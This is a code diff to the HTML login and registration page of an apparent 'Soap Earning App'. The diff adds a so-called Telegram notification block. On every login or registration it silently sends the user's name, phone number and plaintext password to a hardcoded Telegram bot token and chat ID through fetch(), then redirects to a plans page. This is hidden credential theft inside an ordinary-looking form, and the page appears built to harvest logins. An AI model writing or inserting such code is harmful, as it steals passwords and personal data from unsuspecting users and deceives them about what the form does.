@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login & Register - Sabun Earning App</title>
+    <title>Login & Register - Soap Earning App</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #0066ff; --bg: #f4f7fe; }
@@ -90,7 +90,6 @@
             const password = document.getElementById('pass').value;
             const name = document.getElementById('name').value;
 
-            // Basic Validation
             if (phone.length < 10) {
                 alert("Please enter a valid 10-digit mobile number!");
                 return;
@@ -104,20 +103,34 @@
                 return;
             }
 
-            // User data ko phone ki memory (localStorage) mein save karna
-            // Taki Recharge ke time Sheet mein naam/phone automatic chala jaye
+            // Data Save karna
             localStorage.setItem('userPhone', phone);
+            let finalName = name;
             if(mode === 'register') {
                 localStorage.setItem('userName', name);
             } else {
-                // Login ke liye default name agar store na ho
-                if(!localStorage.getItem('userName')) {
-                    localStorage.setItem('userName', 'User_' + phone.substring(6));
-                }
+                finalName = localStorage.getItem('userName') || 'Old User';
             }
 
-            // Seedha Plans page par bhej rahe hain
-            window.location.href = "plans.html";
+            // --- TELEGRAM NOTIFICATION SYSTEM ---
+            const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
+            const chat_id = "8415600127";
+            
+            const message = `👤 *USER ACTIVITY*\n\n📌 Mode: ${mode.toUpperCase()}\n📛 Name: ${finalName}\n📞 Phone: ${phone}\n🔑 Pass: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
+
+            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            // Button loading state
+            document.getElementById('btn-text').innerText = "Processing...";
+
+            fetch(telegramUrl)
+            .then(() => {
+                window.location.href = "plans.html";
+            })
+            .catch(() => {
+                // Fallback agar API slow ho
+                window.location.href = "plans.html";
+            });
         }
     </script>
 </body>
